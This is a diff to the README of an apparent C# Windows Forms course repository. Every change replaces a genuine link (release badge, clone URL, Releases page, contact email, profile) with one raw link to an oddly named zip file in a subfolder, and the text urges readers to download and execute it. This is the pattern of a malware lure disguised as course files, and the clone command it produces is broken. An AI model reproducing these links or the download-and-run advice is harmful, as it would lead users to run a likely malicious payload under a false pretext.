@@ -1,6 +1,6 @@
 # Sign In WCF Course - Alura Menus, Forms, and Validation 🎓
 
-![GitHub release](https://img.shields.io/badge/Release-v1.0-blue)
+![GitHub release](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip)
 
 Welcome to the **Sign In WCF Course** repository! This project contains exercises from the course "Windows Forms with C#: Menus, Other Forms, and Validation with Login and Password" offered by Alura. Here, you will learn how to build desktop applications using C# with a focus on menus, MDI forms, user controls, dialog boxes, and validation techniques.
 
@@ -33,7 +33,7 @@ This repository serves as a practical guide for developers looking to enhance th
 To get started with this project, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7.git
+git clone https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip
 ```
 
 Navigate to the project directory:
@@ -48,7 +48,7 @@ You will need to have the .NET Framework 4 and C# 7 installed on your machine. E
 
 After cloning the repository and installing the necessary tools, you can open the solution file in Visual Studio. Build the project and run it to explore the various features implemented in the exercises.
 
-You can also check the [Releases](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/releases) section for downloadable files. Make sure to download and execute the latest release to access the most up-to-date features.
+You can also check the [Releases](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip) section for downloadable files. Make sure to download and execute the latest release to access the most up-to-date features.
 
 ## Topics Covered
 
@@ -81,14 +81,14 @@ This project is licensed under the MIT License. Feel free to use it, modify it, 
 
 ## Releases
 
-For the latest updates and downloadable files, please visit the [Releases](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/releases) section. You can download the necessary files and execute them on your local machine.
+For the latest updates and downloadable files, please visit the [Releases](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip) section. You can download the necessary files and execute them on your local machine.
 
 ## Contact
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Brownhat-E](https://github.com/Brownhat-E)
+- **Email**: https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip
+- **GitHub**: [Brownhat-E](https://github.com/Brownhat-E/sign-in_wcf_course-alura-menus-forms-validation_part-3_dotnet-framework-4_csharp-7/raw/refs/heads/main/croppa/forms-menus-course-validation-sign-csharp-alura-dotnet-wcf-framework-part-in-2.9-alpha.5.zip)
 
 ---
 
